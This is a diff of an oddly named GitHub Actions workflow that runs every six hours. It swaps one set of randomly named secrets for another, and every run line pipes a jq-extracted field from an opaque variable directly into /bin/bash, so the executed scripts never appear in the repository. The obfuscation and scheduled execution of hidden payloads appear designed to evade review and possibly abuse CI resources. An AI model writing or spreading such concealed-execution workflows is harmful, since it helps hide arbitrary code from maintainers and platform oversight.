@@ -2,35 +2,22 @@ name: sdhgiyuan
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 2/6 * * *'
+    - cron: '3 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: sdhgiyuan
         env:
-          scn3282: ${{ secrets.scn3282 }}
+          lsm1: ${{ secrets.lsm1 }}
         run: |
-          echo $scn3282 | jq -r .qjepp254 | /bin/bash
-          echo $omtoe494 | jq -r .sgjre892 | /bin/bash
-          echo $gp23435 | jq -r .x70523 | /bin/bash
-          echo $hx1 | jq -r .laf90 | /bin/bash
-          echo $amsjd3 | jq -r .bfx82 | /bin/bash
-          echo $iylsw90913 | jq -r .affa03 | /bin/bash
-          echo $z425 | jq -r .sux723 | /bin/bash
-          echo $qbp8 | jq -r .suaet71826 | /bin/bash
-          echo $rcav8430 | jq -r .mj17961 | /bin/bash
-          echo $a887 | jq -r .oa617 | /bin/bash
-          echo $rlnxs22854 | jq -r .xt40 | /bin/bash
-          echo $ysmo6 | jq -r .cibk27 | /bin/bash
-          echo $y67 | jq -r .shvn1 | /bin/bash
-          echo $evz2 | jq -r .ztyj6309 | /bin/bash
-          echo $htjm12331 | jq -r .vcjfg1 | /bin/bash
-          echo $nud7929 | jq -r .axh6 | /bin/bash
-          echo $zcmsg891 | jq -r .wpe01280 | /bin/bash
-          echo $hu2 | jq -r .jnwew31309 | /bin/bash
-          echo $mnuy8 | jq -r .bb81469 | /bin/bash
-          echo $ou41 | jq -r .ygm58936 | /bin/bash
-          echo $gp7168 | jq -r .mg7716 | /bin/bash
+          echo $lsm1 | jq -r .o21 | /bin/bash
+          echo $pyrmi384 | jq -r .od7615 | /bin/bash
+          echo $gcorz5110 | jq -r .gsbcf862 | /bin/bash
+          echo $wv30 | jq -r .yevdc27 | /bin/bash
+          echo $ctbcq82 | jq -r .t547 | /bin/bash
+          echo $z436 | jq -r .b06440 | /bin/bash
+          echo $r70979 | jq -r .pa0 | /bin/bash
 
